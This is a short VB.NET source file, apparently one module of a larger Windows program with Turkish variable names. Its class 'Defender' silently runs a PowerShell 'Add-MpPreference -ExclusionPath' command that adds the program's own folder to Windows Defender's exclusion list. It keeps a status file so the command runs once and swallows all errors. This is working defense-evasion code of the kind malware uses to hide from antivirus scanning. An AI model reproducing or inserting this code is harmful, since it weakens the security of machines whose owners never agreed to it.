Imports System.IO

Public Class Defender
    Public Sub W10_Defn_Run()
        Try
            If File.Exists(AppYol & DefYol) = True Then
            Else
                My.Computer.FileSystem.WriteAllText(AppYol & DefYol, String.Empty, False)
                Win10_Def_Write()
            End If
            If Win10Def_Read() = Nothing Then
                My.Computer.FileSystem.DeleteFile(AppYol & DefYol)
                My.Computer.FileSystem.WriteAllText(AppYol & DefYol, String.Empty, False)
                Win10_Def_Write()
            Else
                If Win10Def_Read() = "Aktif" Then
                    Dim Sh = Process.Start("PowerShell", "Add-MpPreference -ExclusionPath " + "'" + AppYol + "'")
                    File.WriteAllText(AppYol & DefYol, File.ReadAllText(AppYol & DefYol).Replace("Aktif", "Pasif"))
                    Sh.Close()
                End If
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Sub Win10_Def_Write()
        Dim fs As FileStream = New FileStream(AppYol & DefYol, FileMode.Append)
        Dim sw As StreamWriter = New StreamWriter(fs)
        sw.WriteLine(DefStatus)
        sw.Flush()
        sw.Close()
    End Sub
    Public Function Win10Def_Read()
        Dim Reader As New StreamReader(AppYol & DefYol)
        Dim Str_Oku = Reader.ReadLine()
        Reader.Close()
        Return Str_Oku
    End Function
End Class
